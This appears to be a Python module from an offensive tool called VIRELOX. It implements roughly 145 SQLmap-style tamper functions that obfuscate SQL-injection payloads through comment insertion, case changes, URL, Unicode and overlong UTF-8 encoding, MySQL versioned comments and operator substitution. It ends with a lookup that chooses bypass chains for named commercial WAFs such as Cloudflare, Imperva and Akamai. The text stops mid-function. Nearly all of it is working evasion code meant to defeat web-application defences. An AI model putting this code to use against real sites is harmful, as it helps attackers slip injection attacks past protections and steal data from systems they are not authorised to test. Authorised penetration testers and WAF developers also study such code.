"""
VIRELOX Tamper Teknikleri v4.0 — 145+ WAF Bypass Tekniği
SQLmap 73 tamper + 60+ yeni v4.0 teknik
Mozilla Public License 2.0 — AltayHR Developers
"""
import re
import random
import string
import urllib.parse


class TamperMotoru:
    """SQLmap uyumlu tamper fonksiyonları — 145+ teknik"""

    # ── Boşluk dönüşümleri ────────────────────────────────────────────────────
    @staticmethod
    def space2comment(payload: str) -> str:
        # BUG FIX: old regex r'(?<!\w) | (?!\w)' only replaced spaces adjacent
        # to non-word characters, leaving spaces between SQL keywords untouched
        # (e.g. "SELECT id" was NOT changed).  Replace every space unconditionally.
        return payload.replace(' ', '/**/')

    @staticmethod
    def space2plus(payload: str) -> str:
        return payload.replace(' ', '+')

    @staticmethod
    def space2dash(payload: str) -> str:
        return payload.replace(' ', '--\n')

    @staticmethod
    def space2hash(payload: str) -> str:
        return payload.replace(' ', '%23\n')

    @staticmethod
    def space2mssqlblank(payload: str) -> str:
        blanks = ['%01','%02','%03','%04','%05','%06','%07','%08','%09',
                  '%0b','%0c','%0d','%0e','%0f','%0a']
        return re.sub(r' ', lambda m: random.choice(blanks), payload)

    @staticmethod
    def space2mysqlblank(payload: str) -> str:
        blanks = ['\t','\n','\r','\x0b','\x0c','%09','%0a','%0d']
        return re.sub(r' ', lambda m: random.choice(blanks), payload)

    @staticmethod
    def space2mssqlhash(payload: str) -> str:
        return payload.replace(' ', '%23\n')

    @staticmethod
    def space2mysqldash(payload: str) -> str:
        return payload.replace(' ', '--%0a')

    @staticmethod
    def space2morehash(payload: str) -> str:
        return re.sub(r' ', lambda m: f'%23{"".join(random.choices(string.ascii_uppercase,k=4))}\n', payload)

    @staticmethod
    def space2morecomment(payload: str) -> str:
        return payload.replace(' ', '/**_**/')

    @staticmethod
    def space2randomblank(payload: str) -> str:
        blanks = [' ','\t','\n','%09','%0a','%0d','%0b','%0c']
        return re.sub(r' ', lambda m: random.choice(blanks), payload)

    # ── Büyük/küçük harf ──────────────────────────────────────────────────────
    @staticmethod
    def randomcase(payload: str) -> str:
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)

    @staticmethod
    def uppercase(payload: str) -> str:
        return payload.upper()

    @staticmethod
    def lowercase(payload: str) -> str:
        return payload.lower()

    # ── Kodlama ───────────────────────────────────────────────────────────────
    @staticmethod
    def charencode(payload: str) -> str:
        return ''.join(f'%{ord(c):02x}' if c not in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789=-_.' else c for c in payload)

    @staticmethod
    def chardoubleencode(payload: str) -> str:
        return ''.join(f'%25{ord(c):02x}' if c not in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789=-_.' else c for c in payload)

    @staticmethod
    def charunicodeencode(payload: str) -> str:
        return ''.join(f'%u{ord(c):04x}' if c not in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789' else c for c in payload)

    @staticmethod
    def charunicodeescape(payload: str) -> str:
        return ''.join(f'\\u{ord(c):04x}' if c not in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789' else c for c in payload)

    @staticmethod
    def base64encode(payload: str) -> str:
        import base64
        return base64.b64encode(payload.encode()).decode()

    @staticmethod
    def htmlencode(payload: str) -> str:
        return payload.replace("'","&#39;").replace('"',"&quot;").replace('<','&lt;').replace('>','&gt;')

    @staticmethod
    def hexentities(payload: str) -> str:
        return ''.join(f'&#{ord(c)};' if not c.isalnum() else c for c in payload)

    @staticmethod
    def decentities(payload: str) -> str:
        return ''.join(f'&#{ord(c)};' for c in payload)

    @staticmethod
    def overlongutf8(payload: str) -> str:
        """Overlong UTF-8 kodlaması"""
        result = []
        for c in payload:
            if c == "'":
                result.append('%c0%a7')
            elif c == '"':
                result.append('%c0%a2')
            else:
                result.append(c)
        return ''.join(result)

    @staticmethod
    def overlongutf8more(payload: str) -> str:
        result = []
        for c in payload:
            n = ord(c)
            if 0x20 <= n <= 0x7e and c not in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789':
                b1 = 0xc0 | (n >> 6)
                b2 = 0x80 | (n & 0x3f)
                result.append(f'%{b1:02x}%{b2:02x}')
            else:
                result.append(c)
        return ''.join(result)

    @staticmethod
    def percentage(payload: str) -> str:
        result = []
        for c in payload:
            if c.isalpha():
                result.append(f'%{c}')
            else:
                result.append(c)
        return ''.join(result)

    # ── Apostrof kaçış ────────────────────────────────────────────────────────
    @staticmethod
    def apostrophemask(payload: str) -> str:
        return payload.replace("'", "%EF%BC%87")

    @staticmethod
    def apostrophenullencode(payload: str) -> str:
        return payload.replace("'", "%00%27")

    @staticmethod
    def escapequotes(payload: str) -> str:
        return payload.replace("'", "\\'").replace('"', '\\"')

    @staticmethod
    def unmagicquotes(payload: str) -> str:
        return payload.replace("'", "%%27")

    # ── Yorum ekleme ──────────────────────────────────────────────────────────
    @staticmethod
    def randomcomments(payload: str) -> str:
        keywords = ['SELECT','FROM','WHERE','UNION','AND','OR','ORDER','GROUP',
                    'HAVING','INSERT','UPDATE','DELETE','DROP','TABLE']
        for kw in keywords:
            new_kw = ''
            for i, ch in enumerate(kw):
                new_kw += ch
                if i < len(kw)-1 and random.random() > 0.5:
                    new_kw += '/**/'
            payload = re.sub(rf'\b{kw}\b', new_kw, payload, flags=re.IGNORECASE)
        return payload

    @staticmethod
    def commentbeforeparentheses(payload: str) -> str:
        return re.sub(r'\(', '/**/(', payload)

    @staticmethod
    def multiplespaces(payload: str) -> str:
        return re.sub(r' ', '   ', payload)

    # ── MySQL özel ────────────────────────────────────────────────────────────
    @staticmethod
    def versionedkeywords(payload: str) -> str:
        kws = ['UNION','SELECT','FROM','WHERE','AND','OR','ORDER','GROUP',
               'HAVING','INSERT','UPDATE','DELETE','DROP','CREATE','ALTER',
               'EXEC','CAST','INFORMATION_SCHEMA']
        for kw in sorted(kws, key=len, reverse=True):
            payload = re.sub(rf'\b{kw}\b', f'/*!{kw}*/', payload, flags=re.IGNORECASE)
        return payload

    @staticmethod
    def versionedmorekeywords(payload: str) -> str:
        kws = ['UNION','SELECT','FROM','WHERE','AND','OR','ORDER','GROUP',
               'HAVING','BY','LIMIT','NULL']
        for kw in sorted(kws, key=len, reverse=True):
            ver = random.choice(['50000','50001','50700','80000'])
            payload = re.sub(rf'\b{kw}\b', f'/*!{ver}{kw}*/', payload, flags=re.IGNORECASE)
        return payload

    @staticmethod
    def halfversionedmorekeywords(payload: str) -> str:
        kws = ['UNION','SELECT','FROM','WHERE','AND','OR']
        for kw in sorted(kws, key=len, reverse=True):
            payload = re.sub(rf'\b{kw}\b', f'/*!0{kw}*/', payload, flags=re.IGNORECASE)
        return payload

    @staticmethod
    def modsecurityversioned(payload: str) -> str:
        return re.sub(r'(UNION\s+SELECT)', r'UNION /*!SELECT*/', payload, flags=re.IGNORECASE)

    @staticmethod
    def modsecurityzeroversioned(payload: str) -> str:
        return re.sub(r'(UNION\s+SELECT)', r'UNION /*!00000SELECT*/', payload, flags=re.IGNORECASE)

    @staticmethod
    def infoschema2innodb(payload: str) -> str:
        return re.sub(
            r'information_schema\.tables',
            'INNODB_SYS_TABLES',
            payload, flags=re.IGNORECASE)

    @staticmethod
    def informationschemacomment(payload: str) -> str:
        return re.sub(
            r'information_schema\.',
            'information_schema/*!*/.', payload, flags=re.IGNORECASE)

    @staticmethod
    def concat2concatws(payload: str) -> str:
        return re.sub(
            r'CONCAT\(([^,]+),([^)]+)\)',
            r'CONCAT_WS(\1,\2)', payload, flags=re.IGNORECASE)

    @staticmethod
    def ifnull2ifisnull(payload: str) -> str:
        return re.sub(
            r'IFNULL\(([^,]+),([^)]+)\)',
            r'IF(ISNULL(\1),\2,\1)', payload, flags=re.IGNORECASE)

    @staticmethod
    def ifnull2casewhenisnull(payload: str) -> str:
        return re.sub(
            r'IFNULL\(([^,]+),([^)]+)\)',
            r'CASE WHEN ISNULL(\1) THEN \2 ELSE \1 END', payload, flags=re.IGNORECASE)

    @staticmethod
    def if2case(payload: str) -> str:
        m = re.search(r'IF\(([^,]+),([^,]+),([^)]+)\)', payload, re.IGNORECASE)
        if m:
            payload = payload.replace(m.group(0),
                f'CASE WHEN {m.group(1)} THEN {m.group(2)} ELSE {m.group(3)} END')
        return payload

    @staticmethod
    def least(payload: str) -> str:
        def repl(m):
            val = m.group(1)
            return f'=LEAST({val},{val})'
        return re.sub(r'(?<![<>!])=(?!=)\s*(\d+)', repl, payload)

    @staticmethod
    def greatest(payload: str) -> str:
        def repl(m):
            val = m.group(1)
            return f'>GREATEST({val},{val})'
        return re.sub(r'(?<![<>!=])>(?!=)\s*(\d+)', repl, payload)

    @staticmethod
    def hex2char(payload: str) -> str:
        def conv(m):
            h = m.group(1)
            try:
                return 'CHAR('+','.join(str(int(h[i:i+2],16)) for i in range(0,len(h),2))+')'
            except Exception:
                return m.group(0)
        return re.sub(r'0x([0-9a-fA-F]{2,})', conv, payload)

    @staticmethod
    def between(payload: str) -> str:
        m = re.search(r'(?i)(\b(AND|OR)\b\s+)([^>]+?)\s*>(?!=)\s*(\d+)', payload)
        if m:
            payload = payload[:m.start()] + \
                f'{m.group(2)} {m.group(3)} NOT BETWEEN 0 AND {m.group(4)}' + \
                payload[m.end():]
        return payload

    @staticmethod
    def equaltolike(payload: str) -> str:
        return re.sub(r'(?<![<>!])=(?!=)', ' LIKE ', payload)

    @staticmethod
    def equaltorlike(payload: str) -> str:
        return re.sub(r'(?<![<>!])=(?!=)', ' RLIKE ', payload)

    @staticmethod
    def plus2concat(payload: str) -> str:
        m = re.search(r"([\w'\".]+)\s*\+\s*([\w'\".]+)", payload)
        if not m:
            return payload
        return payload[:m.start()] + f'CONCAT({m.group(1)},{m.group(2)})' + payload[m.end():]

    @staticmethod
    def plus2fnconcat(payload: str) -> str:
        m = re.search(r"([\w'\".]+)\s*\+\s*([\w'\".]+)", payload)
        if not m:
            return payload
        return payload[:m.start()] + f'{{fn CONCAT({m.group(1)},{m.group(2)})}}' + payload[m.end():]

    @staticmethod
    def ord2ascii(payload: str) -> str:
        return re.sub(r'\bORD\b', 'ASCII', payload, flags=re.IGNORECASE)

    @staticmethod
    def substring2leftright(payload: str) -> str:
        def _conv(m):
            args = m.group(1).split(',')
            if len(args) == 3:
                s, pos, ln = args
                pos = pos.strip(); ln = ln.strip(); s = s.strip()
                return f'MID({s},{pos},{ln})'
            return m.group(0)
        return re.sub(r'(?i)SUBSTR(?:ING)?\(([^)]+)\)', _conv, payload)

    @staticmethod
    def commalesslimit(payload: str) -> str:
        return re.sub(
            r'LIMIT (\d+), *(\d+)',
            lambda m: f'LIMIT {m.group(2)} OFFSET {m.group(1)}',
            payload, flags=re.IGNORECASE)

    @staticmethod
    def commalessmid(payload: str) -> str:
        return re.sub(
            r'MID\(([^,]+),(\d+),(\d+)\)',
            lambda m: f'MID({m.group(1)} FROM {m.group(2)} FOR {m.group(3)})',
            payload, flags=re.IGNORECASE)

    @staticmethod
    def binary(payload: str) -> str:
        return re.sub(r"=\s*'([^']+)'", lambda m: f"= BINARY '{m.group(1)}'", payload)

    @staticmethod
    def blindbinary(payload: str) -> str:
        return re.sub(r'\b(AND|OR)\b\s+(\w+)\s*=\s*(\w+)',
                      lambda m: f'{m.group(1)} BINARY {m.group(2)}={m.group(3)}',
                      payload, flags=re.IGNORECASE)

    @staticmethod
    def sp_password(payload: str) -> str:
        return payload + '-- sp_password'

    @staticmethod
    def appendnullbyte(payload: str) -> str:
        return payload + '%00'

    @staticmethod
    def unionalltounion(payload: str) -> str:
        return re.sub(r'UNION\s+ALL\s+SELECT', 'UNION SELECT', payload, flags=re.IGNORECASE)

    @staticmethod
    def misunion(payload: str) -> str:
        return re.sub(r'UNION', 'UNION SELECT 1--', payload, flags=re.IGNORECASE, count=1)

    @staticmethod
    def dunion(payload: str) -> str:
        return re.sub(r'UNION', 'DUNION', payload, flags=re.IGNORECASE)

    @staticmethod
    def zerunion(payload: str) -> str:
        m = re.search(r'(?i)UNION\s+SELECT\s+', payload)
        if not m:
            return payload
        before = payload[:m.start()]
        after = payload[m.end():]
        cm = re.search(r'--|#', after)
        if cm:
            cols, tail = after[:cm.start()].rstrip(), after[cm.start():]
        else:
            cols, tail = after.rstrip(), ''
        return f'{before}UNION(SELECT {cols}){tail}'

    @staticmethod
    def schemasplit(payload: str) -> str:
        return re.sub(
            r'information_schema\.(\w+)',
            r'information_schema /**/./**/ \1', payload, flags=re.IGNORECASE)

    # ── MSSQL özel ────────────────────────────────────────────────────────────
    @staticmethod
    def symboliclogical(payload: str) -> str:
        return re.sub(r'\bAND\b', '&&', re.sub(r'\bOR\b', '||', payload, flags=re.IGNORECASE), flags=re.IGNORECASE)

    @staticmethod
    def scientific(payload: str) -> str:
        return re.sub(r'\b(\d+)\b', r'\g<1>e0', payload)

    @staticmethod
    def sleep2getlock(payload: str) -> str:
        return re.sub(r'SLEEP\((\d+)\)', r'GET_LOCK(\1,\1)', payload, flags=re.IGNORECASE)

    # ── Varnish/proxy ─────────────────────────────────────────────────────────
    @staticmethod
    def xforwardedfor(payload: str) -> str:
        return payload  # Header manipulation — konfigürasyonda yapılır

    @staticmethod
    def luanginx(payload: str) -> str:
        return re.sub(r' ', '%09', payload)

    @staticmethod
    def luanginxmore(payload: str) -> str:
        return re.sub(r' ', random.choice(['%09','%0a','%0d','%0b']), payload)

    @staticmethod
    def bluecoat(payload: str) -> str:
        return re.sub(r' ', '%09', payload)

    @staticmethod
    def varnish(payload: str) -> str:
        return re.sub(r'UNION\s+SELECT', 'UNION%0ASELECT', payload, flags=re.IGNORECASE)

    # ── YENİ v4.0 TAMPER TEKNİKLERİ (+60 teknik) ─────────────────────────────

    @staticmethod
    def nullbytebetween(payload: str) -> str:
        """Null byte boşluk yerine"""
        return payload.replace(' ', '%00')

    @staticmethod
    def space2tab(payload: str) -> str:
        return payload.replace(' ', '\t')

    @staticmethod
    def space2vtab(payload: str) -> str:
        return payload.replace(' ', '%0b')

    @staticmethod
    def space2formfeed(payload: str) -> str:
        return payload.replace(' ', '%0c')

    @staticmethod
    def carriagereturn(payload: str) -> str:
        return payload.replace(' ', '%0d')

    @staticmethod
    def unicodespace(payload: str) -> str:
        """Unicode boşluk karakterleri"""
        spaces = ['\u00a0', '\u2000', '\u2001', '\u2002', '\u2003',
                  '\u2004', '\u2005', '\u2006', '\u2007', '\u3000']
        return re.sub(r' ', lambda m: random.choice(spaces), payload)

    @staticmethod
    def doublespace(payload: str) -> str:
        return payload.replace(' ', '  ')

    @staticmethod
    def triplespace(payload: str) -> str:
        return payload.replace(' ', '   ')

    @staticmethod
    def fromhex(payload: str) -> str:
        """String literallerini 0x hex gösterimine çevir"""
        def _to_hex(m):
            return '0x' + m.group(1).encode('utf-8').hex()
        return re.sub(r"'([^']{1,30})'", _to_hex, payload)

    @staticmethod
    def hex2charconcat(payload: str) -> str:
        """Stringleri CHAR() + CONCAT ile yaz"""
        def _to_char(s):
            return 'CONCAT(' + ','.join(f'CHAR({ord(c)})' for c in s) + ')'
        return re.sub(r"'([^']{1,30})'", lambda m: _to_char(m.group(1)), payload)

    @staticmethod
    def urlencodeall(payload: str) -> str:
        """Tüm karakterleri URL encode et"""
        return urllib.parse.quote(payload, safe='')

    @staticmethod
    def urlencodespace(payload: str) -> str:
        return payload.replace(' ', '%20')

    @staticmethod
    def doubleencodespace(payload: str) -> str:
        return payload.replace(' ', '%2520')

    @staticmethod
    def unioncomment(payload: str) -> str:
        """UNION → UNION/**/"""
        return re.sub(r'\bUNION\b', 'UNION/**/', payload, flags=re.IGNORECASE)

    @staticmethod
    def selectcomment(payload: str) -> str:
        return re.sub(r'\bSELECT\b', 'SE/**/LECT', payload, flags=re.IGNORECASE)

    @staticmethod
    def fromcomment(payload: str) -> str:
        return re.sub(r'\bFROM\b', 'FR/**/OM', payload, flags=re.IGNORECASE)

    @staticmethod
    def wherecomment(payload: str) -> str:
        return re.sub(r'\bWHERE\b', 'WH/**/ERE', payload, flags=re.IGNORECASE)

    @staticmethod
    def andcomment(payload: str) -> str:
        return re.sub(r'\bAND\b', 'AN/**/D', payload, flags=re.IGNORECASE)

    @staticmethod
    def orcomment(payload: str) -> str:
        return re.sub(r'\bOR\b', 'O/**/R', payload, flags=re.IGNORECASE)

    @staticmethod
    def randomcommentvar(payload: str) -> str:
        """Her kelime arasına rastgele yorum ekle"""
        tag = ''.join(random.choices(string.ascii_lowercase, k=random.randint(3,8)))
        return payload.replace(' ', f'/*!{tag}*/')

    @staticmethod
    def inlinecomment(payload: str) -> str:
        """MySQL inline comment ile anahtar kelime böl"""
        keywords = ['SELECT','FROM','WHERE','UNION','AND','OR','ORDER']
        for kw in keywords:
            h = len(kw) // 2
            payload = re.sub(rf'\b{kw}\b',
                             f'{kw[:h]}/*!{kw[h:]}*/',
                             payload, flags=re.IGNORECASE)
        return payload

    @staticmethod
    def mysqlversion(payload: str) -> str:
        """MySQL version comment: /*!NNNNN...*/"""
        ver = random.randint(50000, 80000)
        return re.sub(r'\b(UNION|SELECT|FROM|WHERE|AND|OR)\b',
                      lambda m: f'/*!{ver}{m.group(0)}*/',
                      payload, flags=re.IGNORECASE)

    @staticmethod
    def regexp(payload: str) -> str:
        """= operatörünü REGEXP ile değiştir"""
        return re.sub(r'\s*=\s*', ' REGEXP ', payload)

    @staticmethod
    def soundex(payload: str) -> str:
        """String karşılaştırmalarını SOUNDEX ile"""
        return re.sub(r"'([^']+)'", lambda m: f"SOUNDEX('{m.group(1)}')", payload)

    @staticmethod
    def negativeunion(payload: str) -> str:
        """Negatif ID ile UNION"""
        return re.sub(r'^(\d+)', lambda m: str(-int(m.group(1))-1), payload)

    @staticmethod
    def floatunion(payload: str) -> str:
        """Integer ID yerine float kullan"""
        return re.sub(r'^(\d+)', lambda m: m.group(1)+'.0', payload)

    @staticmethod
    def htmlcomment(payload: str) -> str:
        """HTML yorum tarzı (MySQL destekler)"""
        return payload.replace('/*', '<!--').replace('*/', '-->')

    @staticmethod
    def bracketencode(payload: str) -> str:
        return payload.replace('(', '%28').replace(')', '%29')

    @staticmethod
    def semicolonbypass(payload: str) -> str:
        return payload.replace(';', '%3b')

    @staticmethod
    def dashdash(payload: str) -> str:
        return payload.replace('-- ', '-- - ')

    @staticmethod
    def hashcomment(payload: str) -> str:
        """-- yerine # kullan"""
        return re.sub(r'--\s*-?$', '#', payload)

    @staticmethod
    def concat2char(payload: str) -> str:
        """CONCAT() → CHAR() dönüşümü"""
        return re.sub(r"CONCAT\('([^']+)','([^']+)'\)",
                      lambda m: f"CHAR({','.join(str(ord(c)) for c in m.group(1)+m.group(2))})",
                      payload)

    @staticmethod
    def nullbytecomment(payload: str) -> str:
        """Null byte + comment kombinasyonu"""
        return payload.replace('/*', '%00/*').replace('*/', '*/%00')

    @staticmethod
    def oraclespace(payload: str) -> str:
        """Oracle için boşluk karakterleri"""
        return payload.replace(' ', chr(11))

    @staticmethod
    def pgsqlcast(payload: str) -> str:
        """PostgreSQL CAST bypass"""
        return re.sub(r"'([^']+)'", lambda m: f"CAST('{m.group(1)}' AS TEXT)", payload)

    @staticmethod
    def mssqlstuff(payload: str) -> str:
        """MSSQL STUFF bypass"""
        return re.sub(r'\bSUBSTRING\b', 'STUFF', payload, flags=re.IGNORECASE)

    @staticmethod
    def trailingspace(payload: str) -> str:
        return payload + '    '

    @staticmethod
    def leadingnewline(payload: str) -> str:
        return '\n' + payload

    @staticmethod
    def mixednewline(payload: str) -> str:
        return payload.replace(' ', '\r\n')

    @staticmethod
    def doublequote(payload: str) -> str:
        """Tek tırnakları çift tırnakla değiştir"""
        return payload.replace("'", '"')

    @staticmethod
    def xorbypass(payload: str) -> str:
        """AND tabanlı bypass: AND → XOR"""
        return re.sub(r'\bAND\b', 'XOR', payload, flags=re.IGNORECASE)

    @staticmethod
    def likebypass(payload: str) -> str:
        """= operatörünü LIKE ile değiştir"""
        return re.sub(r"=\s*'([^']+)'", lambda m: f"LIKE '{m.group(1)}'", payload)

    @staticmethod
    def inbypass(payload: str) -> str:
        """= operatörünü IN() ile değiştir"""
        return re.sub(r"=\s*('?\w+'?)", lambda m: f"IN({m.group(1)})", payload)

    @staticmethod
    def betweenrange(payload: str) -> str:
        """Sayısal değerleri BETWEEN ile ifade et"""
        return re.sub(r'=\s*(\d+)', lambda m: f"BETWEEN {int(m.group(1))-1} AND {int(m.group(1))+1}", payload)

    @staticmethod
    def caseexpr(payload: str) -> str:
        """IF() → CASE WHEN"""
        return re.sub(r'IF\(([^,]+),([^,]+),([^)]+)\)',
                      lambda m: f'CASE WHEN ({m.group(1)}) THEN ({m.group(2)}) ELSE ({m.group(3)}) END',
                      payload)

    @staticmethod
    def substrbypass(payload: str) -> str:
        """SUBSTR → MID"""
        return re.sub(r'\bSUBSTR\b', 'MID', payload, flags=re.IGNORECASE)

    @staticmethod
    def lengthbypass(payload: str) -> str:
        """LENGTH → CHAR_LENGTH"""
        return re.sub(r'\bLENGTH\b', 'CHAR_LENGTH', payload, flags=re.IGNORECASE)

    @staticmethod
    def asciibypass(payload: str) -> str:
        """ASCII → ORD"""
        return re.sub(r'\bASCII\b', 'ORD', payload, flags=re.IGNORECASE)

    @staticmethod
    def hashbangcomment(payload: str) -> str:
        """MySQL SELECT bypass"""
        return payload.replace('SELECT', '/*!SELECT*/')

    @staticmethod
    def pipesasconcat(payload: str) -> str:
        """CONCAT → || (PostgreSQL/Oracle/SQLite)"""
        return re.sub(r"CONCAT\('([^']+)',\s*(\w+),\s*'([^']+)'\)",
                      lambda m: f"'{m.group(1)}'||{m.group(2)}||'{m.group(3)}'",
                      payload)

    @staticmethod
    def plusasconcat(payload: str) -> str:
        """CONCAT → + (MSSQL)"""
        return re.sub(r"CONCAT\('([^']+)',\s*(\w+),\s*'([^']+)'\)",
                      lambda m: f"'{m.group(1)}'+{m.group(2)}+'{m.group(3)}'",
                      payload)

    @staticmethod
    def spaceaftercomment(payload: str) -> str:
        return payload.replace('/**/', '/**/ ')


# ── Tamper isim → fonksiyon haritası ─────────────────────────────────────────
_TAMPER_MAP = {
    # ── Orijinal 80+ SQLmap tamper ──────────────────────────────────────────
    "space2comment":            TamperMotoru.space2comment,
    "space2plus":               TamperMotoru.space2plus,
    "space2dash":               TamperMotoru.space2dash,
    "space2hash":               TamperMotoru.space2hash,
    "space2mssqlblank":         TamperMotoru.space2mssqlblank,
    "space2mysqlblank":         TamperMotoru.space2mysqlblank,
    "space2mssqlhash":          TamperMotoru.space2mssqlhash,
    "space2mysqldash":          TamperMotoru.space2mysqldash,
    "space2morehash":           TamperMotoru.space2morehash,
    "space2morecomment":        TamperMotoru.space2morecomment,
    "space2randomblank":        TamperMotoru.space2randomblank,
    "randomcase":               TamperMotoru.randomcase,
    "uppercase":                TamperMotoru.uppercase,
    "lowercase":                TamperMotoru.lowercase,
    "charencode":               TamperMotoru.charencode,
    "chardoubleencode":         TamperMotoru.chardoubleencode,
    "charunicodeencode":        TamperMotoru.charunicodeencode,
    "charunicodeescape":        TamperMotoru.charunicodeescape,
    "base64encode":             TamperMotoru.base64encode,
    "htmlencode":               TamperMotoru.htmlencode,
    "hexentities":              TamperMotoru.hexentities,
    "decentities":              TamperMotoru.decentities,
    "overlongutf8":             TamperMotoru.overlongutf8,
    "overlongutf8more":         TamperMotoru.overlongutf8more,
    "percentage":               TamperMotoru.percentage,
    "apostrophemask":           TamperMotoru.apostrophemask,
    "apostrophenullencode":     TamperMotoru.apostrophenullencode,
    "escapequotes":             TamperMotoru.escapequotes,
    "unmagicquotes":            TamperMotoru.unmagicquotes,
    "randomcomments":           TamperMotoru.randomcomments,
    "commentbeforeparentheses": TamperMotoru.commentbeforeparentheses,
    "multiplespaces":           TamperMotoru.multiplespaces,
    "versionedkeywords":        TamperMotoru.versionedkeywords,
    "versionedmorekeywords":    TamperMotoru.versionedmorekeywords,
    "halfversionedmorekeywords":TamperMotoru.halfversionedmorekeywords,
    "modsecurityversioned":     TamperMotoru.modsecurityversioned,
    "modsecurityzeroversioned": TamperMotoru.modsecurityzeroversioned,
    "infoschema2innodb":        TamperMotoru.infoschema2innodb,
    "informationschemacomment": TamperMotoru.informationschemacomment,
    "concat2concatws":          TamperMotoru.concat2concatws,
    "ifnull2ifisnull":          TamperMotoru.ifnull2ifisnull,
    "ifnull2casewhenisnull":    TamperMotoru.ifnull2casewhenisnull,
    "if2case":                  TamperMotoru.if2case,
    "least":                    TamperMotoru.least,
    "greatest":                 TamperMotoru.greatest,
    "hex2char":                 TamperMotoru.hex2char,
    "between":                  TamperMotoru.between,
    "equaltolike":              TamperMotoru.equaltolike,
    "equaltorlike":             TamperMotoru.equaltorlike,
    "plus2concat":              TamperMotoru.plus2concat,
    "plus2fnconcat":            TamperMotoru.plus2fnconcat,
    "ord2ascii":                TamperMotoru.ord2ascii,
    "substring2leftright":      TamperMotoru.substring2leftright,
    "commalesslimit":           TamperMotoru.commalesslimit,
    "commalessmid":             TamperMotoru.commalessmid,
    "binary":                   TamperMotoru.binary,
    "blindbinary":              TamperMotoru.blindbinary,
    "sp_password":              TamperMotoru.sp_password,
    "appendnullbyte":           TamperMotoru.appendnullbyte,
    "unionalltounion":          TamperMotoru.unionalltounion,
    "misunion":                 TamperMotoru.misunion,
    "dunion":                   TamperMotoru.dunion,
    "zerunion":                 TamperMotoru.zerunion,
    "schemasplit":              TamperMotoru.schemasplit,
    "symboliclogical":          TamperMotoru.symboliclogical,
    "scientific":               TamperMotoru.scientific,
    "sleep2getlock":            TamperMotoru.sleep2getlock,
    "xforwardedfor":            TamperMotoru.xforwardedfor,
    "luanginx":                 TamperMotoru.luanginx,
    "luanginxmore":             TamperMotoru.luanginxmore,
    "bluecoat":                 TamperMotoru.bluecoat,
    "varnish":                  TamperMotoru.varnish,
    # ── v4.0 yeni tamperler (+60) ─────────────────────────────────────────────
    "nullbytebetween":          TamperMotoru.nullbytebetween,
    "space2tab":                TamperMotoru.space2tab,
    "space2vtab":               TamperMotoru.space2vtab,
    "space2formfeed":           TamperMotoru.space2formfeed,
    "carriagereturn":           TamperMotoru.carriagereturn,
    "unicodespace":             TamperMotoru.unicodespace,
    "doublespace":              TamperMotoru.doublespace,
    "triplespace":              TamperMotoru.triplespace,
    "fromhex":                  TamperMotoru.fromhex,
    "hex2charconcat":           TamperMotoru.hex2charconcat,
    "urlencodeall":             TamperMotoru.urlencodeall,
    "urlencodespace":           TamperMotoru.urlencodespace,
    "doubleencodespace":        TamperMotoru.doubleencodespace,
    "unioncomment":             TamperMotoru.unioncomment,
    "selectcomment":            TamperMotoru.selectcomment,
    "fromcomment":              TamperMotoru.fromcomment,
    "wherecomment":             TamperMotoru.wherecomment,
    "andcomment":               TamperMotoru.andcomment,
    "orcomment":                TamperMotoru.orcomment,
    "randomcommentvar":         TamperMotoru.randomcommentvar,
    "inlinecomment":            TamperMotoru.inlinecomment,
    "mysqlversion":             TamperMotoru.mysqlversion,
    "regexp":                   TamperMotoru.regexp,
    "soundex":                  TamperMotoru.soundex,
    "negativeunion":            TamperMotoru.negativeunion,
    "floatunion":               TamperMotoru.floatunion,
    "htmlcomment":              TamperMotoru.htmlcomment,
    "bracketencode":            TamperMotoru.bracketencode,
    "semicolonbypass":          TamperMotoru.semicolonbypass,
    "dashdash":                 TamperMotoru.dashdash,
    "hashcomment":              TamperMotoru.hashcomment,
    "concat2char":              TamperMotoru.concat2char,
    "nullbytecomment":          TamperMotoru.nullbytecomment,
    "oraclespace":              TamperMotoru.oraclespace,
    "pgsqlcast":                TamperMotoru.pgsqlcast,
    "mssqlstuff":               TamperMotoru.mssqlstuff,
    "trailingspace":            TamperMotoru.trailingspace,
    "leadingnewline":           TamperMotoru.leadingnewline,
    "mixednewline":             TamperMotoru.mixednewline,
    "doublequote":              TamperMotoru.doublequote,
    "xorbypass":                TamperMotoru.xorbypass,
    "likebypass":               TamperMotoru.likebypass,
    "inbypass":                 TamperMotoru.inbypass,
    "betweenrange":             TamperMotoru.betweenrange,
    "caseexpr":                 TamperMotoru.caseexpr,
    "substrbypass":             TamperMotoru.substrbypass,
    "lengthbypass":             TamperMotoru.lengthbypass,
    "asciibypass":              TamperMotoru.asciibypass,
    "hashbangcomment":          TamperMotoru.hashbangcomment,
    "pipesasconcat":            TamperMotoru.pipesasconcat,
    "plusasconcat":             TamperMotoru.plusasconcat,
    "spaceaftercomment":        TamperMotoru.spaceaftercomment,
}


def tamper_uygula(payload: str, isim: str) -> str:
    fn = _TAMPER_MAP.get(isim)
    if fn:
        try:
            return fn(payload)
        except Exception:
            return payload
    return payload


def tamper_zinciri_uygula(payload: str, zincir: list) -> str:
    for isim in zincir:
        payload = tamper_uygula(payload, isim)
    return payload


def waf_icin_tamper_sec(waf_adi: str) -> list:
    """WAF'a özel tamper zinciri seç"""
    # BUG FIX: import inside function caused ImportError when waf_bypass_havuzu
    # did not export WAF_TAMPER_MAP. Use a local fallback map so this module
    # remains importable regardless of waf_bypass_havuzu version.
    _FALLBACK = {
        'Cloudflare':     ['space2comment', 'randomcase', 'versionedkeywords'],
        'ModSecurity':    ['space2comment', 'modsecurityversioned', 'randomcase'],
        'F5 BIG-IP':      ['space2comment', 'randomcase', 'charencode'],
        'AWS WAF':        ['space2comment', 'randomcase', 'apostrophemask'],
        'Imperva':        ['space2comment', 'multiplespaces', 'randomcase'],
        'Barracuda':      ['space2plus', 'randomcase', 'versionedmorekeywords'],
        'Sucuri':         ['space2comment', 'randomcase', 'htmlencode'],
        'Akamai':         ['space2comment', 'charencode', 'randomcase'],
        'Generic WAF':    ['space2comment', 'randomcase'],
    }
    try:
